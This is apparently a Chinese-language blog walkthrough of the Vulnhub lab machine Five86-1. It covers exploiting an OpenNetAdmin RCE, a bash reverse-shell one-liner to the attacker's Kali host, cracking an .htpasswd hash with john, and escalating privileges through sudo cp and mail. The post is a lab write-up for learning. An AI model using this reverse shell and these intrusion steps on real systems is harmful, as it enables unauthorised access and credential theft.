---
title: 'Five86-1 : Walkthrough'
date: 2020-05-06T13:38:37+08:00
author: 2hanx
layout: post
categories:
  - Vulnhub
---
### 主机识别

`nmap -sn 192.168.1.1/24`

### 网络拓扑

| 计算机       | IP              |
| --------- | --------------- |
| 本机（Win10） | `192.168.1.108` |
| Kali      | `192.168.1.105` |
| Five86-1  | `192.168.1.107` |

### 扫描端口和版本信息

`nmap -A 192.168.1.107`

![1.png](https://i.loli.net/2020/05/06/MPSpUKiVcZd8FCr.png) 

### 访问Web并确定web应用

根据 Nmap 扫描结果可知，根目录存在 **robots.txt** ，访问 _/ona_ 子目录

![2.png](https://i.loli.net/2020/05/06/SQa2nTwGxlZoCWN.png) 

![3.png](https://i.loli.net/2020/05/06/QBo7FUDLYAOxkWz.png) 

找到 Web 应用是 **OpenNetAdmin v18.1.1**，进行 OSINT

![4.png](https://i.loli.net/2020/05/06/n6vK1EkV2XpYzRj.png) 

看来该 Web 应用存在 **RCE** ，这下 _getshell_ 就变得简单了。我使用 GitHub 的 [exploit](https://github.com/amriunix/ona-rce)

![5.png](https://i.loli.net/2020/05/06/UD6sTCk83g47pc2.png) 

### 提权

与虚拟机建立 bash 连接，以便执行更多程序，执行命令 `bash -c 'bash -i >& /dev/tcp/192.168.1.105/4466 0>&1'`

Kali 监听 **4466** 端口

![6.png](https://i.loli.net/2020/05/06/VhkMSWpiKGXfZHC.png) 

并在 Kali 上下载 _LinEnum.sh_ 脚本到 `/tmp` 目录下运行

![7.png](https://i.loli.net/2020/05/06/GeFaBE2ZnKV6tYk.png) 

![8.png](https://i.loli.net/2020/05/06/sMIcemAZzu57a3U.png) 

对于 `/etc/passwd` 我们没有写权限，因此之前惯用的方法失效了，不过根据 `/var/www/.htpasswd` 提供的信息可以暴力破解 hash 密码。不过在此之前就是制作字典

![9.png](https://i.loli.net/2020/05/06/eijLvVIkgG7d3nu.png) 

将用户名和密码复制粘贴到 _hash.txt_ 文件中，使用 `john` 命令工具进行字典爆破

`douglas:<span class="katex math inline">apr1</span>9fgG/hiM$BtsL9qpNHUlylaLxk81qY1`

![10.png](https://i.loli.net/2020/05/06/YRTcnxWrCp5PdDv.png) 

至此我们得到用户名 _douglas_ 的账户密码：`fatherrrrr`

![11.png](https://i.loli.net/2020/05/06/hJOUZq2tceTH97n.png) 

经过许久的探索，终于找到一条重要信息：_douglas_ 用户可以无需密码运行 _jen_ 账户的 `/bin/cp` 命令。接下来我尝试复制信息到 `/etc/passwd` 文件失败。嗯~，在这卡了一段时间，后来通过网上找到一种方法：找 _jen_ 用户所属的文件

`find / -type f -user jen 2>/dev/null`

我们看到 _jen_ 用户有一条 mail 信息（ `/var/mail/jen` ），使用 `/bin/cp` 命令将邮件信息复制出来

> 直接将 `/var/mail/jen` 复制出来不能读，可以通过在 `/tmp` 中新建文本文件，并修改权限后将复制的出来的内容替换进去 

![13.png](https://i.loli.net/2020/05/06/K9HUp3tqwScyAgj.png) 

得到 _moss_ 用户的密码：`Fire!Fire!`

![14.png](https://i.loli.net/2020/05/06/6fPZsOl2eSyi9nm.png) 

在用户目录下，存在一个游戏目录，我们运行它就可以得到 _root_ 权限了

![15.png](https://i.loli.net/2020/05/06/AasDT8Nj5bYJv7o.png) 

### 总结

在进入 **OpenNetAdmin** 面板后没有第一时间去找 Web 应用程序和版本，而是到处点点，查看功能等选项。甚至切换为 _admin_ 用户（我也不知为啥一试 _admin:admin_ 就登录了 ）。因此需要将确定运行的应用程序放在首位，根据应用程序和版本上网查询是否存在漏洞，其次才是详细查看程序功能点等，这样会节省一些时间